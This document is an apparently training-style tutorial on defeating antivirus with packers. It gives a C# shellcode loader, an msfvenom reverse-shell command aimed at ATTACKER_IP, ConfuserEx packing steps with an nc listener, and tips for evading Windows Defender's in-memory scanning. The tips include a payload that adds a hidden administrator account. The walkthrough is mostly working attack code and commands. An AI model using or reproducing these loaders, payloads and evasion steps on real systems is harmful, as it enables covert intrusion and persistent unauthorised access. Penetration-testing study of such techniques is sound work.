# Packers

Packers are pieces of software that take a program as input and transform it so that its structure looks different, 
but their functionality remains exactly the same. Packers do this with two main goals in mind:

* Compress the program so that it takes up less space.
* Protect the program from reverse engineering in general.

Packers can also obfuscate malware without much effort. There are quite a large number of packers, including UPX, 
MPRESS, Themida, and many others.

If an AV is catching a reverse shell executable as malicious because it matches a known signature, using a packer 
will transform the reverse shell executable so that it does not match any known signatures while on disk. As a result, 
you should be able to distribute your payload to any machine's disk without much problem.

Some AV solutions could still catch the packed application:
* While the original code might be transformed into something unrecognisable,the packed executable contains a stub 
with the unpacker's code. If the unpacker has a known signature, AV solutions might still flag any packed executable 
based on the unpacker stub alone.
* At some point, the application will unpack the original code into memory so that it can be executed. If the AV 
solution can do in-memory scans, it might still be detected after the code is unpacked.

## Packing

`UnEncStagelessPayload.cs`:

```text
using System;
using System.Net;
using System.Text;
using System.Configuration.Install;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;

public class Program {
  [DllImport("kernel32")]
  private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

  [DllImport("kernel32")]
  private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);

  [DllImport("kernel32")]
  private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

  private static UInt32 MEM_COMMIT = 0x1000;
  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

  public static void Main()
  {
    byte[] shellcode = new byte[] {0xfc,0x48,0x83,...,0xda,0xff,0xd5 };


    UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);

    IntPtr threadHandle = IntPtr.Zero;
    UInt32 threadId = 0;
    IntPtr parameter = IntPtr.Zero;
    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);

    WaitForSingleObject(threadHandle, 0xFFFFFFFF);

  }
}
```

Generate a new shellcode and put it into the shellcode variable of the code:

    C:\> msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=7478 -f csharp

Compile the payload in the Windows machine:

    C:\> csc UnEncStagelessPayload.cs

Use the ConfuserEx packer: 

1. Select the desktop as the base directory, then drag and drop the executable on the interface.
2. Go to the settings tab and select the payload. 
3. Click the "+" button to add settings to the payload. This creates a rule named "true". 
4. Enable compression.
5. Edit the "true" rule and set it to the Maximum preset.
6. Go to the "Protect!" tab and click "Protect".
7. set up an `nc` listener on the attack machine.
8. Execute the payload.

Works! But ... when running a command on the reverse shell, the AV notices it and kills it. Windows Defender will 
hook certain Windows API calls and do in-memory scanning whenever such API calls are used. In the case of any shell 
generated with msfvenom, `CreateProcess()` will be invoked and detected.

## Now what?

* Just wait a bit. Try spawning the reverse shell again and wait for around 5 minutes before sending any command. 
You'll see the AV won't complain anymore. The reason for this is that scanning memory is an expensive operation. 
Therefore, the AV will do it for a while after your process starts but will eventually stop.
* Use smaller payloads. The smaller the payload, the less likely it is to be detected. If you use msfvenom to get a 
single command executed instead of a reverse shell, the AV will have a harder time detecting it. You can try with 

```text
msfvenom -a x64 -p windows/x64/exec CMD='net user pwnd Password321 /add;net localgroup administrators pwnd /add' -f csharp 
```

